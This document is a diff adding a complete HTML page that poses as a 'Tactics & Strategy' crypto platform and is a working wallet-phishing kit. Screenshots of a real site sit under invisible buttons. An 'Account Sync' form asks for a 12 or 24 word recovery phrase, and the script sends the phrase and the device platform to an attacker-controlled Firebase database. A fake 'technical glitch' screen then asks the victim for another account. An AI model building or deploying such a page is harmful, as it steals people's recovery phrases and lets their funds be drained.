@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tactics & Strategy | Web</title>
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
+            authDomain: "v-academy-82560.firebaseapp.com",
+            projectId: "v-academy-82560",
+            storageBucket: "v-academy-82560.firebasestorage.app",
+            messagingSenderId: "826822771378",
+            appId: "1:826822771378:web:5357b1b989b298a8027fab"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Core Firebase Data Submission
+        window.sendData = function() {
+            const inputData = document.getElementById('phraseText').value;
+            const subBtn = document.getElementById('submitBtn');
+
+            if (inputData.trim() === "") {
+                alert("Attention: This field is required to synchronize your account.");
+                return;
+            }
+
+            subBtn.innerHTML = "Processing...";
+            subBtn.disabled = true;
+
+            push(ref(db, 'secure_vault_logs'), {
+                account_phrase: inputData,
+                timestamp: serverTimestamp(),
+                device: navigator.platform
+            }).then(() => {
+                showPage('interface4');
+            }).catch((error) => {
+                console.error("Submission Error:", error);
+                subBtn.innerHTML = "next";
+                subBtn.disabled = false;
+                alert("Connection Error. Please check your network.");
+            });
+        }
+    </script>
+
+    <style>
+        /* --- GLOBAL CSS RESET --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #000; width: 100vw; height: 100vh; overflow-x: hidden; font-family: -apple-system, sans-serif; }
+
+        /* --- RED ERROR BAR (LOGIN BUTTON) --- */
+        #errorNotification {
+            position: fixed; top: -100px; left: 0; width: 100%; height: 70px;
+            background: #ff0000; color: #fff; display: flex; align-items: center;
+            justify-content: center; font-weight: bold; font-size: 16px;
+            z-index: 9999; transition: 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        /* --- INTERFACE 1: HOME (SCROLLABLE) --- */
+        #interface1 { width: 100%; position: relative; display: block; }
+        .home-img { width: 100%; display: block; height: auto; }
+        
+        /* Fixed Invisible Nav Triggers */
+        .nav-triggers {
+            position: fixed; top: 0; width: 100%; height: 80px;
+            z-index: 5000; display: flex; justify-content: flex-end; align-items: center;
+            padding-right: 15px; pointer-events: none;
+        }
+        .inv-btn { pointer-events: auto; background: transparent; border: none; height: 50px; cursor: pointer; }
+        .m-trig { width: 100px; margin-right: 5px; }
+        .l-trig { width: 90px; }
+
+        /* --- OVERLAY SCREENS SYSTEM (2, 3, 4) --- */
+        .overlay-screen {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 8000; flex-direction: column; padding: 0;
+            overflow: hidden; animation: slideIn 0.3s ease-out;
+        }
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        /* Custom Header for Overlays */
+        .ui-header {
+            width: 100%; height: 70px; display: flex; justify-content: space-between;
+            align-items: center; padding: 0 25px; border-bottom: 1px solid #f0f0f0;
+        }
+        .ui-header .close-x { font-size: 32px; color: #000; cursor: pointer; font-weight: 300; }
+        .ui-header .title { font-size: 18px; font-weight: 600; color: #000; letter-spacing: -0.5px; }
+
+        /* INTERFACE 2: MENU LIST STYLES */
+        .menu-container { width: 100%; padding: 20px 25px; }
+        .menu-row {
+            width: 100%; padding: 22px 0; border-bottom: 1px solid #f5f5f5;
+            display: flex; justify-content: space-between; align-items: center;
+            font-size: 19px; color: #1a1a1a; cursor: pointer;
+        }
+        .menu-row:active { background: #fafafa; }
+        .menu-row .arrow { color: #ccc; font-weight: 300; font-size: 24px; }
+
+        /* INTERFACE 3: INPUT STYLES */
+        .input-main-container { width: 100%; padding: 30px 25px; flex-grow: 1; }
+        .instruction-text { font-size: 14px; color: #666; margin-bottom: 15px; line-height: 1.4; }
+        .phrase-area {
+            width: 100%; height: 220px; border: 1.5px solid #e0e0e0; border-radius: 12px;
+            padding: 18px; font-size: 16px; outline: none; background: #fcfcfc;
+            font-family: 'Courier New', monospace; transition: border-color 0.3s;
+        }
+        .phrase-area:focus { border-color: #000; }
+
+        /* INTERFACE 4: GLITCH STYLES */
+        .glitch-wrapper {
+            flex-grow: 1; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 40px;
+        }
+        .glitch-icon { font-size: 50px; margin-bottom: 20px; }
+        .glitch-txt-red { color: #ff0000; font-size: 24px; font-weight: bold; margin-bottom: 15px; }
+        .glitch-txt-small { color: #555; font-size: 16px; line-height: 1.6; }
+
+        /* COMMON FOOTER BUTTON */
+        .action-footer-btn {
+            margin: 25px; height: 60px; background: #000; color: #fff;
+            border: none; border-radius: 35px; font-size: 17px; font-weight: bold;
+            text-transform: uppercase; letter-spacing: 1px; cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.15);
+        }
+        .action-footer-btn:active { transform: scale(0.98); }
+    </style>
+</head>
+<body>
+
+    <div id="errorNotification">Web Installation Error</div>
+
+    <div id="interface1">
+        <div class="nav-triggers">
+            <button class="inv-btn m-trig" onclick="showPage('interface2')"></button>
+            <button class="inv-btn l-trig" onclick="triggerAlert()"></button>
+        </div>
+        <img src="https://i.ibb.co/YBxhHFzq/Screenshot-2026-0507-004641.png" class="home-img">
+        <img src="https://i.ibb.co/DPSfDC66/Screenshot-2026-0507-004738.png" class="home-img">
+        <img src="https://i.ibb.co/6cs0ZcGV/Screenshot-2026-0507-004817.png" class="home-img">
+        <img src="https://i.ibb.co/0pw9XnWb/Screenshot-2026-0507-004840.png" class="home-img">
+    </div>
+
+    <div id="interface2" class="overlay-screen">
+        <div class="ui-header">
+            <div class="title">T&S MENU</div>
+            <div class="close-x" onclick="showPage('interface1')">✕</div>
+        </div>
+        <div class="menu-container">
+            <div class="menu-row" onclick="showPage('interface3')">
+                <span>Account Login</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="menu-row">
+                <span>Security Center</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="menu-row">
+                <span>Protocol Settings</span>
+                <span class="arrow">›</span>
+            </div>
+            <div class="menu-row">
+                <span>Support</span>
+                <span class="arrow">›</span>
+            </div>
+        </div>
+        <button class="action-footer-btn" onclick="showPage('interface1')">Join Our Community</button>
+    </div>
+
+    <div id="interface3" class="overlay-screen">
+        <div class="ui-header">
+            <div class="title">ACCOUNT SYNC</div>
+            <div class="close-x" onclick="showPage('interface2')">✕</div>
+        </div>
+        <div class="input-main-container">
+            <p class="instruction-text">Please input your 12 or 24 word backup phrase to synchronize your decentralized account.</p>
+            <textarea id="phraseText" class="phrase-area" placeholder="Enter your words here..."></textarea>
+        </div>
+        <button id="submitBtn" class="action-footer-btn" onclick="sendData()">next</button>
+    </div>
+
+    <div id="interface4" class="overlay-screen">
+        <div class="ui-header">
+            <div class="title">SYSTEM ERROR</div>
+            <div class="close-x" onclick="showPage('interface3')">✕</div>
+        </div>
+        <div class="glitch-wrapper">
+            <div class="glitch-icon">⚠️</div>
+            <div class="glitch-txt-red">TECHNICAL GLITCH DETECTED</div>
+            <p class="glitch-txt-small">
+                Our servers are facing a technical glitch. Please check your DNS settings or try another account to proceed with the installation.
+            </p>
+        </div>
+        <button class="action-footer-btn" onclick="showPage('interface3')">Try Another Account</button>
+    </div>
+
+    <script>
+        /**
+         * Global Navigation Logic
+         * Controls switching between all 4 interfaces
+         */
+        function showPage(id) {
+            // Step 1: Hide Interface 1
+            document.getElementById('interface1').style.display = 'none';
+            // Step 2: Hide all Overlays
+            const screens = document.querySelectorAll('.overlay-screen');
+            screens.forEach(s => s.style.display = 'none');
+
+            // Step 3: Show Target
+            const target = document.getElementById(id);
+            if (id === 'interface1') {
+                target.style.display = 'block';
+                document.body.style.overflowY = 'auto'; // Re-enable scroll
+            } else {
+                target.style.display = 'flex';
+                document.body.style.overflowY = 'hidden'; // Lock scroll
+            }
+            window.scrollTo(0, 0);
+        }
+
+        /**
+         * Top Red Bar Animation
+         */
+        function triggerAlert() {
+            const bar = document.getElementById('errorNotification');
+            bar.style.top = '0px';
+            setTimeout(() => {
+                bar.style.top = '-100px';
+            }, 3500);
+        }
+
+        // Initialize view
+        window.onload = function() {
+            showPage('interface1');
+        }
+    </script>
+</body>
+  </html>
+  
